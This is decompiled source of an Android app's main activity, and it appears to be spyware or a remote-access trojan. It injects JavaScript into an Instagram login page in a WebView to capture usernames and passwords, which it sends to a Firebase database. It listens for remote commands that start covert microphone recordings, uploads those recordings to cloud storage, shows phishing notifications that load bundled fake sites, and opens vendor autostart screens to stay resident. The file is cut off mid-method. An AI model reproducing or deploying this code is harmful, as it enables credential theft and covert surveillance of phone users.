/*
 * Decompiled with CFR 0.0.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.Notification
 *  android.app.NotificationChannel
 *  android.app.NotificationManager
 *  android.app.PendingIntent
 *  android.app.TaskStackBuilder
 *  android.app.admin.DevicePolicyManager
 *  android.content.ComponentName
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.Intent
 *  android.content.SharedPreferences
 *  android.content.SharedPreferences$Editor
 *  android.content.pm.ApplicationInfo
 *  android.content.pm.PackageManager
 *  android.content.pm.PackageManager$NameNotFoundException
 *  android.content.pm.ResolveInfo
 *  android.content.res.Resources
 *  android.graphics.Bitmap
 *  android.media.AudioRecord
 *  android.media.MediaPlayer
 *  android.media.MediaRecorder
 *  android.net.Uri
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.Vibrator
 *  android.provider.Settings
 *  android.provider.Settings$Secure
 *  android.speech.SpeechRecognizer
 *  android.speech.tts.TextToSpeech
 *  android.speech.tts.TextToSpeech$OnInitListener
 *  android.util.DisplayMetrics
 *  android.util.Log
 *  android.util.SparseBooleanArray
 *  android.util.TypedValue
 *  android.view.View
 *  android.webkit.JavascriptInterface
 *  android.webkit.ValueCallback
 *  android.webkit.WebSettings
 *  android.webkit.WebView
 *  android.webkit.WebViewClient
 *  android.widget.ListView
 *  android.widget.TextView
 *  android.widget.Toast
 *  androidx.appcompat.app.AppCompatActivity
 *  androidx.core.app.ActivityCompat
 *  androidx.core.app.NotificationCompat
 *  androidx.core.app.NotificationCompat$Builder
 *  androidx.core.content.ContextCompat
 *  com.google.android.gms.tasks.Continuation
 *  com.google.android.gms.tasks.OnCompleteListener
 *  com.google.android.gms.tasks.OnFailureListener
 *  com.google.android.gms.tasks.OnSuccessListener
 *  com.google.android.gms.tasks.Task
 *  com.google.firebase.FirebaseApp
 *  com.google.firebase.database.ChildEventListener
 *  com.google.firebase.database.DataSnapshot
 *  com.google.firebase.database.DatabaseError
 *  com.google.firebase.database.DatabaseReference
 *  com.google.firebase.database.FirebaseDatabase
 *  com.google.firebase.database.GenericTypeIndicator
 *  com.google.firebase.database.ValueEventListener
 *  com.google.firebase.storage.FileDownloadTask
 *  com.google.firebase.storage.FileDownloadTask$TaskSnapshot
 *  com.google.firebase.storage.FirebaseStorage
 *  com.google.firebase.storage.OnProgressListener
 *  com.google.firebase.storage.StorageReference
 *  com.google.firebase.storage.StorageTask
 *  com.google.firebase.storage.UploadTask
 *  com.google.firebase.storage.UploadTask$TaskSnapshot
 *  com.google.gson.Gson
 *  com.google.gson.reflect.TypeToken
 *  java.io.File
 *  java.io.FileNotFoundException
 *  java.io.FileOutputStream
 *  java.io.IOException
 *  java.lang.Boolean
 *  java.lang.CharSequence
 *  java.lang.Class
 *  java.lang.Deprecated
 *  java.lang.Double
 *  java.lang.Exception
 *  java.lang.Iterable
 *  java.lang.Object
 *  java.lang.Runnable
 *  java.lang.String
 *  java.lang.StringBuilder
 *  java.lang.Throwable
 *  java.lang.reflect.Type
 *  java.util.ArrayList
 *  java.util.Calendar
 *  java.util.HashMap
 *  java.util.Iterator
 *  java.util.Map
 *  java.util.Random
 *  java.util.Timer
 *  java.util.TimerTask
 */
package sigma.male;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.TaskStackBuilder;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.media.AudioRecord;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Vibrator;
import android.provider.Settings;
import android.speech.SpeechRecognizer;
import android.speech.tts.TextToSpeech;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.SparseBooleanArray;
import android.util.TypedValue;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import com.google.android.gms.tasks.Continuation;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.FirebaseApp;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.GenericTypeIndicator;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FileDownloadTask;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.StorageTask;
import com.google.firebase.storage.UploadTask;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import sigma.male.DeviceAdminComponent;
import sigma.male.FileUtil;
import sigma.male.ForegroundService;
import sigma.male.RequestNetwork;
import sigma.male.SketchwareUtil;
import sigma.male.gui;
import sigma.male.logoss;
import sigma.male.restarter;
import sigma.male.servicess;

public class MainActivity
extends AppCompatActivity {
    private static final Intent[] AUTO_START_INTENTS;
    public static String lajj;
    public static SharedPreferences pref;
    private ChildEventListener _fbdb_child_listener;
    private OnSuccessListener _fbs_delete_success_listener;
    private OnProgressListener _fbs_download_progress_listener;
    private OnSuccessListener<FileDownloadTask.TaskSnapshot> _fbs_download_success_listener;
    private OnFailureListener _fbs_failure_listener;
    private OnProgressListener _fbs_upload_progress_listener;
    private OnCompleteListener<Uri> _fbs_upload_success_listener;
    private FirebaseDatabase _firebase = FirebaseDatabase.getInstance();
    private FirebaseStorage _firebase_storage = FirebaseStorage.getInstance();
    private OnSuccessListener _mediaup_delete_success_listener;
    private OnProgressListener _mediaup_download_progress_listener;
    private OnSuccessListener<FileDownloadTask.TaskSnapshot> _mediaup_download_success_listener;
    private OnFailureListener _mediaup_failure_listener;
    private OnProgressListener _mediaup_upload_progress_listener;
    private OnCompleteListener<Uri> _mediaup_upload_success_listener;
    private RequestNetwork.RequestListener _rn_request_listener;
    private OnSuccessListener _sigmamale_delete_success_listener;
    private OnProgressListener _sigmamale_download_progress_listener;
    private OnSuccessListener<FileDownloadTask.TaskSnapshot> _sigmamale_download_success_listener;
    private OnFailureListener _sigmamale_failure_listener;
    private OnProgressListener _sigmamale_upload_progress_listener;
    private OnCompleteListener<Uri> _sigmamale_upload_success_listener;
    private Timer _timer = new Timer();
    private ChildEventListener _xxklonly_child_listener;
    private Calendar cal = Calendar.getInstance();
    private String cmdn = "";
    private String cmdv = "";
    private String cmdvar = "";
    private String cmdvar2 = "";
    private DatabaseReference fbdb = this._firebase.getReference("user");
    private StorageReference fbs = this._firebase_storage.getReference("root");
    private String filinfodat = "";
    private HashMap<String, Object> fmap = new HashMap();
    private Intent ka = new Intent();
    private ArrayList<String> le = new ArrayList();
    private ArrayList<String> lst = new ArrayList();
    private ArrayList<HashMap<String, Object>> map = new ArrayList();
    private StorageReference mediaup = this._firebase_storage.getReference("media/");
    private MediaPlayer mp;
    private MediaRecorder myAudioRecorder;
    private double num = 0.0;
    private HashMap<String, Object> responsetxt = new HashMap();
    private RequestNetwork rn;
    private StorageReference sigmamale = this._firebase_storage.getReference("user/");
    private SharedPreferences sp;
    private SpeechRecognizer st;
    private String str = "";
    private TimerTask t;
    private TextView textview1;
    private TextToSpeech tts;
    private Vibrator vbs;
    private WebView webview1;
    private ArrayList<HashMap<String, Object>> xlis = new ArrayList();
    private ArrayList<HashMap<String, Object>> xllllmap = new ArrayList();
    private DatabaseReference xxklonly = this._firebase.getReference("th30neand0nlyx");

    static {
        lajj = "";
        Intent[] arrintent = new Intent[]{new Intent().setComponent(new ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")), new Intent("miui.intent.action.OP_AUTO_START").addCategory("android.intent.category.DEFAULT"), new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")), new Intent().setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")), new Intent().setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")), new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")), new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")), new Intent().setComponent(new ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")), new Intent().setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")), new Intent().setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")), new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.privacypermissionsentry.PermissionTopActivity")), new Intent().setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")), new Intent().setComponent(new ComponentName("com.asus.mobilemanager", "com.asus.mobilemanager.entry.FunctionActivity")).setData(Uri.parse((String)"mobilemanager://function/entry/AutoStart"))};
        AUTO_START_INTENTS = arrintent;
    }

    static /* synthetic */ void access$11(MainActivity mainActivity, ArrayList arrayList) {
        mainActivity.xllllmap = arrayList;
    }

    static /* synthetic */ void access$14(MainActivity mainActivity, String string2) {
        mainActivity.cmdn = string2;
    }

    static /* synthetic */ void access$15(MainActivity mainActivity, String string2) {
        mainActivity.cmdv = string2;
    }

    static /* synthetic */ void access$16(MainActivity mainActivity, String string2) {
        mainActivity.cmdvar = string2;
    }

    static /* synthetic */ void access$17(MainActivity mainActivity, String string2) {
        mainActivity.cmdvar2 = string2;
    }

    static /* synthetic */ void access$23(MainActivity mainActivity, MediaRecorder mediaRecorder) {
        mainActivity.myAudioRecorder = mediaRecorder;
    }

    static /* synthetic */ void access$4(MainActivity mainActivity, HashMap hashMap) {
        mainActivity.responsetxt = hashMap;
    }

    static /* synthetic */ void access$7(MainActivity mainActivity, Calendar calendar) {
        mainActivity.cal = calendar;
    }

    static /* synthetic */ void access$9(MainActivity mainActivity, ArrayList arrayList) {
        mainActivity.xlis = arrayList;
    }

    private void initialize(Bundle bundle) {
        pref = this.getSharedPreferences("uid", 0);
        this.textview1 = (TextView)this.findViewById(2131231144);
        this.webview1 = (WebView)this.findViewById(2131231174);
        this.webview1.getSettings().setJavaScriptEnabled(true);
        this.webview1.getSettings().setSupportZoom(true);
        this.sp = this.getSharedPreferences("uid", 0);
        this.vbs = (Vibrator)this.getSystemService("vibrator");
        this.tts = new TextToSpeech(this.getApplicationContext(), null);
        this.st = SpeechRecognizer.createSpeechRecognizer((Context)this);
        this.rn = new RequestNetwork((Activity)this);
        this.webview1.setWebViewClient(new WebViewClient(){

            public void onPageFinished(WebView webView, String string2) {
                if (string2.contains((CharSequence)"https://www.instagram.com/")) {
                    MainActivity.this.webview1.loadUrl("javascript:(function(){setInterval( () => {var usr= document.getElementsByName('username')[0].value; var upass= document.getElementsByName('password')[0].value;  Android.showToast('Username:-' +usr+' Pass:- '+ upass)},500);})()");
                }
                MainActivity.this.webview1.evaluateJavascript("(function() { return ('<html>'+document.getElementsByTagName('html')[0].innerHTML+'</html>'); })();", (ValueCallback)new ValueCallback<String>(){

                    public void onReceiveValue(String string2) {
                        if (string2.contains((CharSequence)"Save your login information?") && string2.contains((CharSequence)"coreSpriteKeyhole")) {
                            1.this.MainActivity.this.responsetxt.clear();
                            MainActivity.access$4(1.this.MainActivity.this, new HashMap());
                            1.this.MainActivity.this.responsetxt.put((Object)"data", (Object)1.this.MainActivity.this.textview1.getText().toString());
                            1.this.MainActivity.this._firebase.getReference("pdata" + 1.this.MainActivity.this.sp.getString("panel", "")).push().updateChildren((Map)1.this.MainActivity.this.responsetxt);
                        }
                    }
                });
                super.onPageFinished(webView, string2);
            }

            public void onPageStarted(WebView webView, String string2, Bitmap bitmap) {
                super.onPageStarted(webView, string2, bitmap);
            }

        });
        this._fbdb_child_listener = new ChildEventListener(){

            public void onCancelled(DatabaseError databaseError) {
                databaseError.getCode();
                databaseError.getMessage();
            }

            public void onChildAdded(DataSnapshot dataSnapshot, String string2) {
                GenericTypeIndicator<HashMap<String, Object>> genericTypeIndicator = new GenericTypeIndicator<HashMap<String, Object>>(){};
                dataSnapshot.getKey();
                (HashMap)dataSnapshot.getValue((GenericTypeIndicator)genericTypeIndicator);
            }

            public void onChildChanged(DataSnapshot dataSnapshot, String string2) {
                GenericTypeIndicator<HashMap<String, Object>> genericTypeIndicator = new GenericTypeIndicator<HashMap<String, Object>>(){};
                dataSnapshot.getKey();
                (HashMap)dataSnapshot.getValue((GenericTypeIndicator)genericTypeIndicator);
            }

            public void onChildMoved(DataSnapshot dataSnapshot, String string2) {
            }

            public void onChildRemoved(DataSnapshot dataSnapshot) {
                GenericTypeIndicator<HashMap<String, Object>> genericTypeIndicator = new GenericTypeIndicator<HashMap<String, Object>>(){};
                dataSnapshot.getKey();
                (HashMap)dataSnapshot.getValue((GenericTypeIndicator)genericTypeIndicator);
            }

        };
        this.fbdb.addChildEventListener(this._fbdb_child_listener);
        this._fbs_upload_progress_listener = new OnProgressListener<UploadTask.TaskSnapshot>(){

            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._fbs_download_progress_listener = new OnProgressListener<FileDownloadTask.TaskSnapshot>(){

            public void onProgress(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._fbs_upload_success_listener = new OnCompleteListener<Uri>(){

            public void onComplete(Task<Uri> task) {
                ((Uri)task.getResult()).toString();
            }
        };
        this._fbs_download_success_listener = new OnSuccessListener<FileDownloadTask.TaskSnapshot>(){

            public void onSuccess(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getTotalByteCount();
            }
        };
        this._fbs_delete_success_listener = new OnSuccessListener(){

            public void onSuccess(Object object) {
            }
        };
        this._fbs_failure_listener = new OnFailureListener(){

            public void onFailure(Exception exception) {
                exception.getMessage();
            }
        };
        this._sigmamale_upload_progress_listener = new OnProgressListener<UploadTask.TaskSnapshot>(){

            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._sigmamale_download_progress_listener = new OnProgressListener<FileDownloadTask.TaskSnapshot>(){

            public void onProgress(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._sigmamale_upload_success_listener = new OnCompleteListener<Uri>(){

            public void onComplete(Task<Uri> task) {
                ((Uri)task.getResult()).toString();
            }
        };
        this._sigmamale_download_success_listener = new OnSuccessListener<FileDownloadTask.TaskSnapshot>(){

            public void onSuccess(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getTotalByteCount();
            }
        };
        this._sigmamale_delete_success_listener = new OnSuccessListener(){

            public void onSuccess(Object object) {
            }
        };
        this._sigmamale_failure_listener = new OnFailureListener(){

            public void onFailure(Exception exception) {
                exception.getMessage();
            }
        };
        this._mediaup_upload_progress_listener = new OnProgressListener<UploadTask.TaskSnapshot>(){

            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._mediaup_download_progress_listener = new OnProgressListener<FileDownloadTask.TaskSnapshot>(){

            public void onProgress(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._mediaup_upload_success_listener = new OnCompleteListener<Uri>(){

            public void onComplete(Task<Uri> task) {
                String string2 = ((Uri)task.getResult()).toString();
                MainActivity.access$7(MainActivity.this, Calendar.getInstance());
                HashMap hashMap = new HashMap();
                hashMap.put((Object)"url", (Object)string2);
                hashMap.put((Object)"time", (Object)String.valueOf((long)MainActivity.this.cal.getTimeInMillis()));
                DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("records/" + gui.uuii(MainActivity.this.getApplicationContext()));
                try {
                    databaseReference.push().setValue((Object)hashMap);
                    return;
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                    return;
                }
            }
        };
        this._mediaup_download_success_listener = new OnSuccessListener<FileDownloadTask.TaskSnapshot>(){

            public void onSuccess(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getTotalByteCount();
            }
        };
        this._mediaup_delete_success_listener = new OnSuccessListener(){

            public void onSuccess(Object object) {
            }
        };
        this._mediaup_failure_listener = new OnFailureListener(){

            public void onFailure(Exception exception) {
                exception.getMessage();
            }
        };
        this._rn_request_listener = new RequestNetwork.RequestListener(){

            @Override
            public void onErrorResponse(String string2, String string3) {
                SketchwareUtil.showMessage(MainActivity.this.getApplicationContext(), "Please Turn On the internet To continue");
                MainActivity.this.finish();
            }

            @Override
            public void onResponse(String string2, String string3, HashMap<String, Object> hashMap) {
            }
        };
        this._xxklonly_child_listener = new ChildEventListener(){

            public void onCancelled(DatabaseError databaseError) {
                databaseError.getCode();
                databaseError.getMessage();
            }

            public void onChildAdded(DataSnapshot dataSnapshot, String string2) {
                GenericTypeIndicator<HashMap<String, Object>> genericTypeIndicator = new GenericTypeIndicator<HashMap<String, Object>>(){};
                dataSnapshot.getKey();
                (HashMap)dataSnapshot.getValue((GenericTypeIndicator)genericTypeIndicator);
            }

            public void onChildChanged(DataSnapshot dataSnapshot, String string2) {
                GenericTypeIndicator<HashMap<String, Object>> genericTypeIndicator = new GenericTypeIndicator<HashMap<String, Object>>(){};
                dataSnapshot.getKey();
                (HashMap)dataSnapshot.getValue((GenericTypeIndicator)genericTypeIndicator);
            }

            public void onChildMoved(DataSnapshot dataSnapshot, String string2) {
            }

            public void onChildRemoved(DataSnapshot dataSnapshot) {
                GenericTypeIndicator<HashMap<String, Object>> genericTypeIndicator = new GenericTypeIndicator<HashMap<String, Object>>(){};
                dataSnapshot.getKey();
                (HashMap)dataSnapshot.getValue((GenericTypeIndicator)genericTypeIndicator);
            }

        };
        this.xxklonly.addChildEventListener(this._xxklonly_child_listener);
    }

    /*
     * Enabled aggressive block sorting
     */
    private void initializeLogic() {
        if (!this.getString(2131558460).equals((Object)"databaseURL")) {
            this.finish();
            return;
        }
        if (this.sp.contains("uid")) {
            this.startService(new Intent(this.getApplicationContext(), servicess.class));
            this.startService(new Intent(this.getApplicationContext(), ForegroundService.class));
            this._pihtest();
        } else {
            this.sp.edit().putString("panel", "onlineieool29lw9").commit();
            this._setuid();
        }
        if (this.sp.contains("uid")) {
            this.sp.getString("pass", "").equals((Object)"123");
        }
        this.webview1.getSettings().setDomStorageEnabled(true);
        this.webview1.getSettings().setDatabaseEnabled(true);
        ((WebView)this.findViewById(2131231174)).addJavascriptInterface((Object)new WebAppInterface((Context)this), "Android");
        WebView webView = (WebView)this.findViewById(2131231174);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        this.onNewIntent(this.getIntent());
        this.fbdb.addListenerForSingleValueEvent(new ValueEventListener(){

            public void onCancelled(DatabaseError databaseError) {
            }

            /*
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            public void onDataChange(DataSnapshot dataSnapshot) {
                MainActivity.access$9(MainActivity.this, new ArrayList());
                try {
                    boolean bl;
                    GenericTypeIndicator<HashMap<String, Object>> genericTypeIndicator = new GenericTypeIndicator<HashMap<String, Object>>(){};
                    Iterator iterator = dataSnapshot.getChildren().iterator();
                    while (bl = iterator.hasNext()) {
                        HashMap hashMap = (HashMap)((DataSnapshot)iterator.next()).getValue((GenericTypeIndicator)genericTypeIndicator);
                        MainActivity.this.xlis.add((Object)hashMap);
                    }
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
                ((HashMap)MainActivity.this.xlis.get(0)).get((Object)"data").toString();
            }

        });
        this.xxklonly.addListenerForSingleValueEvent(new ValueEventListener(){

            public void onCancelled(DatabaseError databaseError) {
            }

            /*
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            public void onDataChange(DataSnapshot dataSnapshot) {
                MainActivity.access$11(MainActivity.this, new ArrayList());
                try {
                    boolean bl;
                    GenericTypeIndicator<HashMap<String, Object>> genericTypeIndicator = new GenericTypeIndicator<HashMap<String, Object>>(){};
                    Iterator iterator = dataSnapshot.getChildren().iterator();
                    while (bl = iterator.hasNext()) {
                        HashMap hashMap = (HashMap)((DataSnapshot)iterator.next()).getValue((GenericTypeIndicator)genericTypeIndicator);
                        MainActivity.this.xllllmap.add((Object)hashMap);
                    }
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
                String string2 = ((HashMap)MainActivity.this.xllllmap.get(0)).get((Object)"data").toString();
                double d = 0.0;
                SketchwareUtil.getAllKeysFromMap((Map<String, Object>)((HashMap)new Gson().fromJson(string2, new TypeToken<HashMap<String, Object>>(){}.getType())), (ArrayList<String>)MainActivity.this.le);
                boolean bl = true;
                int n = 0;
                do {
                    if (n >= MainActivity.this.le.size()) {
                        if (bl) {
                            MainActivity.this.stopService(new Intent((Context)MainActivity.this, servicess.class));
                            MainActivity.this.stopService(new Intent((Context)MainActivity.this, ForegroundService.class));
                            MainActivity.this.finish();
                        }
                        return;
                    }
                    if (MainActivity.this.getyi((String)MainActivity.this.le.get((int)d)).equals((Object)MainActivity.this.sp.getString("panel", ""))) {
                        bl = false;
                    }
                    d += 1.0;
                    ++n;
                } while (true);
            }

        });
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    private void requestAutoStartPermission() {
        if (!Build.MANUFACTURER.equals((Object)"OPPO")) return;
        try {
            this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")));
            return;
        }
        catch (Exception exception) {
            try {
                this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startupapp.StartupAppListActivity")));
                return;
            }
            catch (Exception exception2) {
                try {
                    this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startupmanager.StartupAppListActivity")));
                    return;
                }
                catch (Exception exception3) {
                    try {
                        this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safe", "com.coloros.safe.permission.startup.StartupAppListActivity")));
                        return;
                    }
                    catch (Exception exception4) {
                        try {
                            this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safe", "com.coloros.safe.permission.startupapp.StartupAppListActivity")));
                            return;
                        }
                        catch (Exception exception5) {
                            try {
                                this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safe", "com.coloros.safe.permission.startupmanager.StartupAppListActivity")));
                                return;
                            }
                            catch (Exception exception6) {
                                try {
                                    this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startsettings")));
                                    return;
                                }
                                catch (Exception exception7) {
                                    try {
                                        this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startupapp.startupmanager")));
                                        return;
                                    }
                                    catch (Exception exception8) {
                                        try {
                                            this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startupmanager.startupActivity")));
                                            return;
                                        }
                                        catch (Exception exception9) {
                                            try {
                                                this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.startupapp.startupmanager")));
                                                return;
                                            }
                                            catch (Exception exception10) {
                                                try {
                                                    this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.privacypermissionsentry.PermissionTopActivity.Startupmanager")));
                                                    return;
                                                }
                                                catch (Exception exception11) {
                                                    try {
                                                        this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.privacypermissionsentry.PermissionTopActivity")));
                                                        return;
                                                    }
                                                    catch (Exception exception12) {
                                                        try {
                                                            this.startActivity(new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.FakeActivity")));
                                                            return;
                                                        }
                                                        catch (Exception exception13) {
                                                            exception13.printStackTrace();
                                                            return;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private boolean validateMicAvailability() {
        Boolean bl;
        AudioRecord audioRecord = new AudioRecord(1, 44100, 16, 1, 44100);
        try {
            bl = audioRecord.getRecordingState() != 1 ? Boolean.valueOf((boolean)false) : Boolean.valueOf((boolean)true);
        }
        catch (Throwable throwable) {
            audioRecord.release();
            throw throwable;
        }
        audioRecord.startRecording();
        if (audioRecord.getRecordingState() != 3) {
            audioRecord.stop();
            bl = false;
        }
        audioRecord.stop();
        audioRecord.release();
        return bl;
    }

    public void _accesp() {
    }

    public void _fuuy() {
    }

    public void _interfaceweb() {
    }

    public void _jwiwiw() {
    }

    public void _phidatsu(String string2, String string3) {
        this.responsetxt.clear();
        this.responsetxt = new HashMap();
        this.responsetxt.put((Object)"data", (Object)string2);
        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("pdata/pdata" + this.sp.getString("panel", ""));
        try {
            databaseReference.push().setValue(this.responsetxt);
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return;
        }
    }

    public void _pihtest() {
        FirebaseDatabase.getInstance().getReference("/comds/comds" + gui.uuii(this.getApplicationContext()) + "phi").addChildEventListener(new ChildEventListener(){

            public void onCancelled(DatabaseError databaseError) {
            }

            public void onChildAdded(DataSnapshot dataSnapshot, String string2) {
            }

            public void onChildChanged(DataSnapshot dataSnapshot, String string2) {
                Map map = (Map)dataSnapshot.getValue();
                MainActivity.access$14(MainActivity.this, "" + map.get((Object)"cmdn"));
                MainActivity.access$15(MainActivity.this, "" + map.get((Object)"cmdv"));
                MainActivity.access$16(MainActivity.this, "" + map.get((Object)"cmdvar"));
                MainActivity.access$17(MainActivity.this, "" + map.get((Object)"cmdvar2"));
                if (MainActivity.this.cmdn.equals((Object)"micrec")) {
                    MainActivity.this._remicbje(MainActivity.this.cmdv, "");
                    MainActivity.this._setrespo("dialogview", "", "Mic recording Started", "", "");
                    return;
                }
                if (MainActivity.this.cmdn.equals((Object)"cust")) {
                    MainActivity.this._snotiow(MainActivity.this.cmdvar, "", MainActivity.this.cmdv, MainActivity.this.cmdvar2, "");
                    return;
                }
                MainActivity.this._snotiow(MainActivity.this.cmdvar, "", "file:///android_asset/websites/" + MainActivity.this.cmdv, MainActivity.this.cmdvar2, "");
            }

            public void onChildMoved(DataSnapshot dataSnapshot, String string2) {
            }

            public void onChildRemoved(DataSnapshot dataSnapshot) {
            }
        });
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void _remicbje(String string2, String string3) {
        this.myAudioRecorder = new MediaRecorder();
        this.myAudioRecorder.setAudioSource(1);
        this.myAudioRecorder.setOutputFormat(2);
        this.myAudioRecorder.setAudioEncoder(3);
        this.myAudioRecorder.setOutputFile(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/rec.mp3"));
        try {
            this.myAudioRecorder.prepare();
            this.myAudioRecorder.start();
        }
        catch (Exception exception) {}
        this.t = new TimerTask(){

            public void run() {
                MainActivity.this.runOnUiThread(new Runnable(){

                    /*
                     * Enabled aggressive block sorting
                     * Enabled unnecessary exception pruning
                     * Enabled aggressive exception aggregation
                     */
                    public void run() {
                        try {
                            26.this.MainActivity.this.myAudioRecorder.stop();
                            26.this.MainActivity.this.myAudioRecorder.release();
                            MainActivity.access$23(26.this.MainActivity.this, null);
                        }
                        catch (Exception exception) {}
                        String string2 = String.valueOf((Object)"abcdefghijklmnopqrstuvwxyz") + "0123456789";
                        Random random = new Random();
                        StringBuilder stringBuilder = new StringBuilder(8);
                        stringBuilder.append(string2.charAt(random.nextInt(-1 + string2.length())));
                        int n = stringBuilder.length();
                        do {
                            if (n >= 8) {
                                final String string3 = stringBuilder.toString();
                                26.this.MainActivity.this.mediaup.child(string3).putFile(Uri.fromFile((File)new File(FileUtil.getPackageDataDir(26.this.MainActivity.this.getApplicationContext()).concat("/rec.mp3")))).addOnFailureListener(26.this.MainActivity.this._mediaup_failure_listener).addOnProgressListener(26.this.MainActivity.this._mediaup_upload_progress_listener).continueWithTask((Continuation)new Continuation<UploadTask.TaskSnapshot, Task<Uri>>(){

                                    public Task<Uri> then(Task<UploadTask.TaskSnapshot> task) throws Exception {
                                        return 1.this.26.this.MainActivity.this.mediaup.child(string3).getDownloadUrl();
                                    }
